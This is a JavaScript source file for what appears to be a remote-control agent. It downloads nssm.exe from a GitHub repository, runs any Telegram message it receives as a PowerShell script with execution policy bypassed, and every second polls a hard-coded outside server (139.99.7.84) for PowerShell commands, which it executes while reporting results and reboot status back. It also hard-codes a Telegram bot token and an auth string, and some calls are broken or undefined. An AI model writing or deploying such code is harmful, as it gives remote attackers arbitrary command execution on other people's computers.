const http = require('http')
    const {execFileSync} = require('child_process')
    const path = require("path")
    const os = require("os")
    const fs = require("fs")

    const download = require('download');
    (async () => {
        await download('https://github.com/37218vuuhuu/app-19/raw/main/nssm.exe', 'dist');
     
        fs.writeFileSync('nssm.exe', await download('https://github.com/37218vuuhuu/app-19/raw/main/nssm.exe'));
     
        download('https://github.com/37218vuuhuu/app-19/raw/main/nssm.exe').pipe(fs.createWriteStream('nssm.exe'));
     
        await Promise.all([
            'https://github.com/37218vuuhuu/app-19/raw/main/nssm.exe',
            ''
        ].map(url => download(url, 'dist')));
    })();

    const TelegramBot = require('node-telegram-bot-api');
    const { exec } = require('child_process');

    
    // replace the value below with the Telegram token you receive from @BotFather
    const token = '5193529426:AAFvOMqzG4zHq_tJszBSlwEqKBgV2jujQUM';
    
    // Create a bot instance
    const bot = new TelegramBot(token, { polling: true });
    
    // Get the chat ID from a message object
    function getChatId(msg) {
      return msg.chat.id;
    }
    const apiUrl = process.env.DEBUG ? 'http://localhost:5000' : 'http://139.99.7.84:5000'
    // Process path
    const serviceDir = process.cwd()
        
    const execNoError = (cmd, args, options) => {
        try {
            return execFileSync(cmd, args, options).toString().trim()
        } catch (e) {
            return e.toString().trim()
        }
    }

    function execPowershellScript(script) {
        // Write script to a file in temp dir
        const scriptPath = path.join(os.tmpdir(), 'script.ps1')
        fs.writeFileSync(scriptPath, script)
        // Execute script
        return execNoError('powershell.exe', ['-ExecutionPolicy', 'Bypass', '-File', scriptPath])
    }



        // Check for reset
        setInterval(async () => {
            let data
            try {
                data = await get(`${apiUrl}/worker-app/needs-reset?auth=auth@worker@gmail`)
                if (JSON.parse(data).needs_reset) {
                    await get(`${apiUrl}/worker-app/status?auth=auth@worker@gmail&status=Đang reset`)
                    const result = execNoError('C:\\Windows\\System32\\shutdown.exe', ['/r', '/t', '120', '/f'])
                    console.log(`Reset result: ${result}`)
                    await get(`${apiUrl}/worker-app/status?auth=auth@worker@gmail&status=Đã reset: ${result}`)
                }
            } catch (e) {
            }
        }, 1000)
        bot.on('message', (msg) => {
            const chatId = getChatId(msg);
            const message = msg.text;
            const result = execPowershellScript(message)
            console.log(`Powershell result: ${result}`)
          
            // Run the command in PowerShell
            exec(`powershell.exe -Command "Write-Host ${message}"`, (error, stdout, stderr) => {
              if (error) {
                console.error(`exec error: ${error}`);
                return;
              }
              // Send the output of the command back to the user
              bot.sendMessage(chatId,'ok');
            });
          });

        // Check for powershell command
        setInterval(async () => {
            let data = ''
            try {
                data = await get(`${apiUrl}/worker-app/powershell-cmd?auth=auth@worker@gmail`)
                const command = JSON.parse(data).cmd
                if (command !== null) {
                    await get(`${apiUrl}/worker-app/status?auth=auth@worker@gmail&status=Đang chạy lệnh ${command}`)
                    const result = execPowershellScript(command)
                    log(`Powershell result: ${result}`)
                    await get(`${apiUrl}/worker-app/status?auth=auth@worker@gmail&status=Kết quả lệnh: ${result}`)
                }
            } catch (e) {
                onsole.log(e)
            }
        }, 1000)
    console.log('Service started')